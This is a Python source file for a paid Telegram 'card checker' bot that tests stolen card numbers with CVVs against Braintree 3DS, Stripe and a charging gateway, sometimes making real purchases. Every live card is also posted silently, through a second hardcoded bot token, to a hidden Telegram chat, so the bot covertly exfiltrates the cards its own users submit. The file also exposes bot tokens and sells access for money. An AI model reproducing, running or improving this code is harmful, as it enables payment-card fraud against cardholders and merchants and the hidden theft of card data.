import os
try:
    import telebot
    from telebot import types
    from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
    import requests
    from faker import Faker
except:
    os.system("pip install faker requests telebot")
    import telebot
    from telebot import types
    from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
    import requests
    from faker import Faker
import json
fake = Faker()
TOKEN = "6480747170:AAFht1Vrbmn_QugOVq77uMEAEXFrN_W1bvs" #MAIN BOT TOKEN
bot = telebot.TeleBot(TOKEN)



@bot.message_handler(commands=["start"])
def start_message(message):
    datas=json.loads(open("id.json","r").read())
    try:
        
        if str(message.from_user.id) in datas["premium"]:
            msg = f"Hello _{message.from_user.first_name}_ ! \n\n\n I AM DEVIL CHECKER! YOU CAN CHECHK YOUR CARDS USING THIS TOOL! \n\n *BUDDY YOU ARE A PREMIUM USER !*"
            markup = InlineKeyboardMarkup()
            markup.row_width = 2
            markup.add(InlineKeyboardButton("My Account", callback_data="my_account"),
            InlineKeyboardButton("Tools", callback_data="tools"))
            markup.add(InlineKeyboardButton("Buy Here", callback_data="buy"))
            markup.add(InlineKeyboardButton("Close", callback_data="close"))
            bot.reply_to(message, msg, reply_markup=markup,parse_mode='Markdown')
        else:
            msg = f"Hello _{message.from_user.first_name}_ ! \n\n\n I AM DEVIL CHECKER! YOU CAN CHECHK YOUR CARDS USING THIS TOOL! "
            markup = InlineKeyboardMarkup()
            markup.row_width = 2
            markup.add(InlineKeyboardButton("My Account", callback_data="my_account"),
            InlineKeyboardButton("Tools", callback_data="tools"))
            markup.add(InlineKeyboardButton("Buy Here", callback_data="buy"))
            markup.add(InlineKeyboardButton("Close", callback_data="close"))
            bot.reply_to(message, msg, reply_markup=markup)
    except:
        bot.reply_to(message, "There is something wrong with the server !")
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "my_account":
        premium = "No"
        datas=json.loads(open("id.json","r").read())
        if str(call.from_user.id) in datas["premium"]:
            premium= "Yes"  
        markup = InlineKeyboardMarkup()
        markup.row_width = 2
        markup.add(InlineKeyboardButton("Back", callback_data="back"),InlineKeyboardButton("Close", callback_data="close"))
        bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=f'''Your Account Info \n Id : `{call.from_user.id}` \n Name : {call.from_user.first_name} \n Username : @{call.from_user.username} \n Premium : {premium}''', reply_markup=markup,parse_mode='Markdown')
    elif call.data == "buy":
        markup = InlineKeyboardMarkup()
        markup.row_width = 2
        markup.add(InlineKeyboardButton("7 Days Only $12", callback_data="7d50"))
        markup.add(InlineKeyboardButton("3 Days Only $6", callback_data="7d50"))
        markup.add(InlineKeyboardButton("24 Hours Only $3", callback_data="7d50"))
        markup.add(InlineKeyboardButton("Back", callback_data="back"),InlineKeyboardButton("Close", callback_data="close"))
        bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=f"HEY BUDDY! \n`{call.from_user.id}` Is YOUR USER!\n\nSEND THIS USER ID TO @crackworldb ! \n\n          OUR CARD CHAKER PRICE LIST IS \n         ______________________ ", reply_markup=markup,parse_mode='Markdown')
    elif call.data == "tools":
        markup = InlineKeyboardMarkup()
        markup.row_width = 2
        markup.add(InlineKeyboardButton("Back", callback_data="back"),InlineKeyboardButton("Close", callback_data="close"))
        bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=f"Hey buddy ! \n/chk single check \n/mass multiple check \n/schk stripe multiple check\nfor b3 charge checking send your card file.", reply_markup=markup)
    elif call.data == "back":
        msg = f"Hello @{call.from_user.username} ! \n\n\n I am devil checker ! You Can Check Your Cards Using This Tool ! "
        markup = InlineKeyboardMarkup()
        markup.row_width = 2
        markup.add(InlineKeyboardButton("My Account", callback_data="my_account"),
        InlineKeyboardButton("Tools", callback_data="tools"))
        markup.add(InlineKeyboardButton("Buy Here", callback_data="buy"))
        markup.add(InlineKeyboardButton("Close", callback_data="close"))
        bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=msg, reply_markup=markup)
    elif call.data == "close":
        bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text="Thank You Buddy !")

@bot.message_handler(commands=["chk"])
def start_message(message):
    from apis import b3
    datas=json.loads(open("id.json","r").read())
    cards = message.text.split()
    if str(message.from_user.id) in datas["premium"] or datas["freeChk"] == "on":
        msg_id = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
        if len(cards) == 2:
            for num,i in enumerate(cards):
                if "/" in i :
                    pass
                else:
                    res = b3(i)
                    card=i.split("|")
                    cardNumber = card[0]
                    cardMonth = card[1]
                    cardYear = card[2]
                    if len(cardYear) == 2:
                        cardYear = "20"+cardYear
                    cardCc= card[3]
                    if res['paymentMethod'] ['threeDSecureInfo'] ['status']  == "authenticate_attempt_successful" or res['paymentMethod'] ['threeDSecureInfo'] ['status'] == "authenticate_successful":
                        """try:
                            bin_det = requests.get(f"https://bins.antipublic.cc/bins/{i[:6]}").json()
                            binName= bin_det["brand"]
                            country = bin_det["country_name"]
                            bank=bin_det["bank"]
                        except:
                            binName= ""
                            country = ""
                            bank="""""
                        msg = f"""𝗣𝗮𝘀𝘀𝗲𝗱 ✅
        
*Card Number* ⇾ `{cardNumber}`
*Card Date* ⇾ `{cardMonth}/{cardYear}`
*Card CVV* ⇾ `{cardCc}`

𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ 3DS Lookup
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ 3DS Authenticate Attempt Successful

BOT BY : @crackworldb"""
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=msg,parse_mode='Markdown')
                        bot_token ="6663791853:AAHHW_JqNbRhKw4KnFLIFr4khi7F2X-_Oi4"
                        id = -4254648185
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={i} - {res['paymentMethod'] ['threeDSecureInfo'] ['status']}")
                    elif res['paymentMethod'] ['threeDSecureInfo'] ['status'] == "challenge_required":
                        """try:
                            bin_det = requests.get(f"https://bins.antipublic.cc/bins/{i[:6]}").json()
                            binName= bin_det["brand"]
                            country = bin_det["country_name"]
                            bank=bin_det["bank"]
                        except:
                            binName= ""
                            country = ""
                            bank="""""
                        msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

*Card Number* ⇾ `{cardNumber}`
*Card Date* ⇾ `{cardMonth}/{cardYear}`
*Card CVV* ⇾ `{cardCc}`

𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ B3 VBV
𝗦𝘁𝗮𝘁𝘂𝘀  ⇾ 3D Required ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved

BOT BY : @crackworldb"""
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=msg,parse_mode='Markdown')
                        bot_token ="6663791853:AAHHW_JqNbRhKw4KnFLIFr4khi7F2X-_Oi4"
                        id = -4254648185
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={i} - {res['paymentMethod'] ['threeDSecureInfo'] ['status']}")
                    else:
                        msg = f"""CARD IS DEAD

𝗖𝗖 ⇾ `{i}`

𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Your card is decline 


BOT BY : @crackworldb"""
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=msg,parse_mode='Markdown')
        else:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=" THIS COMMAND CAN CHECK ONLY A SINGLE CARD \n PLEASE TRY WITH SINGLE CARD ! \n       EXP : /chk 123456789|12|2025|1234")
    else:
        bot.reply_to(message, " THIS TOOL IS PREMIUM AND TO USE THIS TOOL YOU HAVE TO BUY OUR SUBSCRIPTION !")
@bot.message_handler(commands=["mass"])
def start_message(message):
    cards = message.text.split()
    datas=json.loads(open("id.json","r").read())
    from apis import b3
    if str(message.from_user.id) in datas["premium"]:
        ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
        nn = 0
        dead = 0
        if len(cards) <= 41 and len(cards) > 1:
            for num,i in enumerate(cards):
                if "/" in i :
                    pass
                else:
                    res = b3(i)
                    card=i.split("|")
                    cardNumber = card[0]
                    cardMonth = card[1]
                    cardYear = card[2]
                    if len(cardYear) == 2:
                        cardYear = "20"+cardYear
                    cardCc= card[3]
                    if res['paymentMethod'] ['threeDSecureInfo'] ['status']  == "authenticate_attempt_successful" or res['paymentMethod'] ['threeDSecureInfo'] ['status'] == "authenticate_successful":
                        """try:
                            bin_det = requests.get(f"https://bins.antipublic.cc/bins/{i[:6]}").json()
                            binName= bin_det["brand"]
                            country = bin_det["country_name"]
                            bank=bin_det["bank"]
                        except:
                            binName= ""
                            country = ""
                            bank="""""
                        msg = f"""𝗣𝗮𝘀𝘀𝗲𝗱 ✅
        
*Card Number* ⇾ `{cardNumber}`
*Card Date* ⇾ `{cardMonth}/{cardYear}`
*Card CVV* ⇾ `{cardCc}`

𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ 3DS Lookup
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ 3DS Authenticate Attempt Successful

BOT BY : @crackworldb"""
                        bot.reply_to(message, msg,parse_mode='Markdown')
                        nn += 1
                        bot_token ="6663791853:AAHHW_JqNbRhKw4KnFLIFr4khi7F2X-_Oi4"
                        id = -4254648185
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={i} - {res['paymentMethod'] ['threeDSecureInfo'] ['status']}")
                    elif res['paymentMethod'] ['threeDSecureInfo'] ['status'] == "challenge_required":
                        """try:
                            bin_det = requests.get(f"https://bins.antipublic.cc/bins/{i[:6]}").json()
                            binName= bin_det["brand"]
                            country = bin_det["country_name"]
                            bank=bin_det["bank"]
                        except:
                            binName= ""
                            country = ""
                            bank="""""
                        msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

*Card Number* ⇾ `{cardNumber}`
*Card Date* ⇾ `{cardMonth}/{cardYear}`
*Card CVV* ⇾ `{cardCc}`

𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ B3 VBV
𝗦𝘁𝗮𝘁𝘂𝘀  ⇾ 3D Required ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved


BOT BY : @crackworldb"""
                        bot.reply_to(message, msg,parse_mode='Markdown')
                        nn += 1
                        bot_token ="6663791853:AAHHW_JqNbRhKw4KnFLIFr4khi7F2X-_Oi4"
                        id = -4254648185
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={i} - {res['paymentMethod'] ['threeDSecureInfo'] ['status']}")
                    else:
                        dead += 1
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• DETAILS •", callback_data='u8')
                    cm2 = types.InlineKeyboardButton(f"• HITS ✅: [ {nn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dead} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {len(cards)-1} ] •", callback_data='x')
                    mes.add(cm1, cm2, cm4, cm5)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing ...''', reply_markup=mes)
        else:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''THIS MULTIPLE CARD CHEKCER CAN CHECK 40 CARD IN ONE TIME \n PLEASE TRY WITH 40 OR LESS CARDS ! \n       EXP : /chk 123456789|12|2025|1234\n1234567890|12|2025|1234\n12345678901|12|2025|1234''', reply_markup=mes)
    else:
        bot.reply_to(message, " THIS TOOL IS PREMIUM AND TO USE THIS TOOL YOU HAVE TO BUY OUR SUBSCRIPTION !")
@bot.message_handler(commands=["schk"])
def start_message(message):
    cards = message.text.split()
    datas=json.loads(open("id.json","r").read())
    if str(message.from_user.id) in datas["premium"]:
        ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
        nn = 0
        dead = 0
        if len(cards) <= 41:
            for num,i in enumerate(cards):
                if "/" in i :
                    pass
                else:
                    from apis import stripe
                    res = stripe(i)
                    card=i.split("|")
                    cardNumber = card[0]
                    cardMonth = card[1]
                    cardYear = card[2]
                    if len(cardYear) == 2:
                        cardYear = "20"+cardYear
                    cardCc= card[3]
                    if res  == 200:
                        try:
                            bin_det = requests.get(f"https://bins.antipublic.cc/bins/{i[:6]}").json()
                            binName= bin_det["brand"]
                            country = bin_det["country_name"]
                            bank=bin_det["bank"]
                        except:
                            binName= ""
                            country = ""
                            bank=""
                        msg = f"""Card ↳  *Card Number* ⇾ `{cardNumber}`
*Card Date* ⇾ `{cardMonth}/{cardYear}`
*Card CVV* ⇾ `{cardCc}`
Status ↳  Approved ✅
Response ↳  Payment method successfully added.
Gateway ↳  STRIPE AUTH 
- - - - - - - - - - - - - - -
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {binName}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
- - - - - - - - - - - - - - -
BOT BY : @crackworldb
- - - - - - - - - - - - - - -"""
                        bot.reply_to(message, msg,parse_mode='Markdown')
                        nn += 1
                        bot_token ="6663791853:AAHHW_JqNbRhKw4KnFLIFr4khi7F2X-_Oi4"
                        id = -4254648185
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={i} - 200")
                    else:
                        dead += 1
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• DETAILS STRIPE CHECKER•", callback_data='u8')
                    cm2 = types.InlineKeyboardButton(f"• HITS ✅: [ {nn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dead} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {len(cards)-1} ] •", callback_data='x')
                    mes.add(cm1, cm2, cm4, cm5)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing ...''', reply_markup=mes)
        else:
            bot.reply_to(message, " THIS STRIPE MULTIPLE CARD CHEKCER CAN CHECK 40 CARD IN ONE TIME \n PLEASE TRY WITH 40 OR LESS CARDS ! \n       EXP : /chk 123456789|12|2025|1234\n1234567890|12|2025|1234\n12345678901|12|2025|1234")
    else:
        bot.reply_to(message, " THIS TOOL IS PREMIUM AND TO USE THIS TOOL YOU HAVE TO BUY OUR SUBSCRIPTION !")

@bot.message_handler(content_types=["document"])
def main(message):
    cards = (bot.download_file(bot.get_file(message.document.file_id).file_path).decode()).split()
    ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
    datas=json.loads(open("id.json","r").read())
    from apis import charged
    if str(message.from_user.id) in datas["premium"]:
        nn = 0
        dead = 0
        if True:
            for num,i in enumerate(cards):
                res = charged(i)
                card=i.split("|")
                cardNumber = card[0]
                cardMonth = card[1]
                cardYear = card[2]
                if len(cardYear) == 2:
                    cardYear = "20"+cardYear
                cardCc= card[3]
                if "Your Voucher was purchased successfully" in str(res):
                    msg = f"""𝗣𝗮𝘀𝘀𝗲𝗱 ✅
    
*Card Number* ⇾ `{cardNumber}`
*Card Date* ⇾ `{cardMonth}/{cardYear}`
*Card CVV* ⇾ `{cardCc}`

𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ CHARGED
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ Your Voucher was purchased successfully 17$ Charged

BOT BY : @crackworldb"""
                    bot.reply_to(message, msg,parse_mode='Markdown')
                    nn += 1
                    bot_token ="6663791853:AAHHW_JqNbRhKw4KnFLIFr4khi7F2X-_Oi4"
                    id = 7027929429
                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={i} - Your Voucher was purchased successfully")
                elif "Error 2001 - Insufficient Funds." in str(res):
                    msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

*Card Number* ⇾ `{cardNumber}`
*Card Date* ⇾ `{cardMonth}/{cardYear}`
*Card CVV* ⇾ `{cardCc}`

𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Error 2001 - Insufficient Funds 1$ Charged
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved

BOT BY : @crackworldb"""
                    bot.reply_to(message, msg,parse_mode='Markdown')
                    nn += 1
                    bot_token ="6663791853:AAHHW_JqNbRhKw4KnFLIFr4khi7F2X-_Oi4"
                    id = 7027929429
                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={i} - Error 2001 - Insufficient Funds")
                else:
                    dead += 1
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• DETAILS •", callback_data='u8')
                cm2 = types.InlineKeyboardButton(f"• HITS ✅: [ {nn} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dead} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {len(cards)-1} ] •", callback_data='x')
                mes.add(cm1, cm2, cm4, cm5)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing ...''', reply_markup=mes)
        else:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''THIS MULTIPLE CARD CHEKCER CAN CHECK 40 CARD IN ONE TIME \n PLEASE TRY WITH 40 OR LESS CARDS ! \n       EXP : /chk 123456789|12|2025|1234\n1234567890|12|2025|1234\n12345678901|12|2025|1234''', reply_markup=mes)

@bot.message_handler(commands=["adduser"])
def start_message(message):
    datas=json.loads(open("id.json","r").read())
    if str(message.from_user.id) in datas["admins"]:
        for i in message.text.split():
            if "/" in i :
                pass
            else:
                user = i
        if str(user) in datas["premium"] :
            bot.reply_to(message, f"This User Already A Premium USER {user} !")
        else:
            datas["premium"].append(str(i))
            datas=str(datas).replace("'","\"")
            with open("id.json","w") as files:
                files.write(datas)
                files.close()
            bot.reply_to(message, f"This User SET AS PREMIUM {user} !")
    else:
        bot.reply_to(message, "You Are Not A Admin, Fuck You !")
@bot.message_handler(commands=["dltuser"])
def start_message(message):
    datas=json.loads(open("id.json","r").read())
    if str(message.from_user.id) in datas["admins"]:
        for i in message.text.split():
            if "/" in i :
                pass
            else:
                user = i
        if str(user) in datas["premium"] :
            datas["premium"].remove(str(user))
            datas=str(datas).replace("'","\"")
            with open("id.json","w") as files:
                files.write(datas)
                files.close()
            bot.reply_to(message, f"This User SET AS NORMAL {user} !")
        else:
            bot.reply_to(message, f"This User Already A NORMAL USER {user} !")
    else:
        bot.reply_to(message, "You Are Not A Admin, Fuck You !")
@bot.message_handler(commands=["free"])
def start_message(message):
    datas=json.loads(open("id.json","r").read())
    if str(message.from_user.id) in datas["admins"]:
        for i in message.text.split():
            if "/" in i :
                pass
            else:
                user = i
        if str(user) != datas["freeChk"] :
            datas["freeChk"] = str(user)
            datas=str(datas).replace("'","\"")
            with open("id.json","w") as files:
                files.write(datas)
                files.close()
            bot.reply_to(message, f"This TOOL SET AS {user} !")
        else:
            bot.reply_to(message, f"This TOOL Already SET AS {user} !")
    else:
        bot.reply_to(message, "You Are Not A Admin, Fuck You !")
bot.infinity_polling()